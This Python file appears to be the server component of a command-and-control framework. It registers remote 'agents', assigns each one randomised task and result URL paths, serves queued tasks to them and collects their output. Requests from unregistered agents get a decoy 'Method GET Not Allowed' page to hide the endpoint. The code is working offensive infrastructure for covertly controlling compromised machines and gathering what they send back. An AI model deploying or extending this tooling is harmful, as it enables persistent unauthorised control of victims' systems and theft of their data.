#!/usr/bin/python

import random
import time
import string
from flask import render_template_string
from core.listener import *
from core.agent import *
from config import *
from core.utils import *

def register_agent(port, ip):
    listener_id = listeners_pool.get_id_by_port(port)

    # register new agent
    agent = Http_Agent(ip)
    listeners_pool.add_agent_by_listener_id(listener_id, agent)

    # register path for agent in http server
    agent.get_task_path = "".join(random.choices(string.ascii_letters + string.digits, k=6))
    agent.res_path = "".join(random.choices(string.ascii_letters + string.digits, k=7))

    success(f"[+] New agent with id {agent.agent_id} has connected")
    return (agent.get_task_path + "." + agent.res_path), res_success

def get_agent_task(agent_path):
    agent_obj = None
    for listener in listeners_pool.get_pool():
        for agent in listener.connected_agents.get_pool():
            if agent_path == agent.get_task_path:
                agent_obj = agent
                break
    if not agent_obj:
        return render_template_string("<p>Method GET Not Allowed.</p>"), res_none_existent

    # return task for agent
    agent_obj.set_lastcall(time.time())
    if agent_obj.no_tasks():
        return render_template_string("<p>Method GET Not Allowed.</p>"), res_no_tasks
    
    return agent_obj.get_task(), res_success

def agent_submit_res(agent_path, res):
    agent_obj = None
    for listener in listeners_pool.get_pool():
        for agent in listener.connected_agents.get_pool():
            if agent_path == agent.res_path:
                agent_obj = agent
                break
    if not agent_obj:
        return render_template_string("<p>Method GET Not Allowed.</p>"), res_none_existent
    
    # save res or print
    agent_obj.set_lastcall(time.time())

    if int(state.get()) == int(agent_obj.agent_id):
        success("[+] Agent called back!")
        print(res)
    else:
        agent_obj.add_res(res)

    return render_template_string("<p>Status: Up</p>"), res_success